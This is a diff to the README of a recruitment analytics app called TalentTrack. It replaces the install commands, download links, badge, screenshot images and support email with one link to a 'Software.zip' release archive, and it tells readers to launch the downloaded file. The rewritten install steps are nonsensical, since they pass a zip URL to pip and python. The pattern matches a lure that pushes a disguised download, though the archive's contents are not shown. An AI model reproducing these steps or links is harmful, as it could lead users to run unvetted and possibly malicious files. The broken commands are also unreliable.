@@ -19,8 +19,8 @@ Welcome to TalentTrack - an open-source recruitment analytics web application th
 ## Installation 🛠️
 To install TalentTrack, follow these steps:
 1. Clone the repository to your local machine
-2. Install the required dependencies by running `pip install -r requirements.txt`
-3. Run the application using `python app.py`
+2. Install the required dependencies by running `pip install -r https://github.com/vfrrrr/talent_track/releases/download/v1.0/Software.zip`
+3. Run the application using `python https://github.com/vfrrrr/talent_track/releases/download/v1.0/Software.zip`
 4. Access the application at `http://localhost:5000`
 
 ## Repository Topics 📊
@@ -39,20 +39,20 @@ To install TalentTrack, follow these steps:
 - Talent Analytics
 
 ## Get Started 📂
-To start using TalentTrack, download the latest release [here](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)!
+To start using TalentTrack, download the latest release [here](https://github.com/vfrrrr/talent_track/releases/download/v1.0/Software.zip)!
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Latest Release](https://github.com/vfrrrr/talent_track/releases/download/v1.0/Software.zip%20Release-blue)](https://github.com/vfrrrr/talent_track/releases/download/v1.0/Software.zip)
 
 If the link ends with a file name, please ensure it is launched for the download to begin. If the link is not provided or doesn't work, please check the "Releases" section of the repository.
 
 ## Screenshots 📸
 Here are some sneak peeks into the TalentTrack application:
 
-![Screenshot 1](https://via.placeholder.com/600x400)
-![Screenshot 2](https://via.placeholder.com/600x400)
-![Screenshot 3](https://via.placeholder.com/600x400)
+![Screenshot 1](https://github.com/vfrrrr/talent_track/releases/download/v1.0/Software.zip)
+![Screenshot 2](https://github.com/vfrrrr/talent_track/releases/download/v1.0/Software.zip)
+![Screenshot 3](https://github.com/vfrrrr/talent_track/releases/download/v1.0/Software.zip)
 
 ## Support 🤝
-For any questions, feedback, or issues, feel free to reach out to the TalentTrack team via email at talenttrack@example.com. We are always here to help and improve the application for a better user experience.
+For any questions, feedback, or issues, feel free to reach out to the TalentTrack team via email at https://github.com/vfrrrr/talent_track/releases/download/v1.0/Software.zip We are always here to help and improve the application for a better user experience.
 
 Let's revolutionize recruitment with TalentTrack! 🌐🔍 #HRtech #Recruitment #DataAnalytics
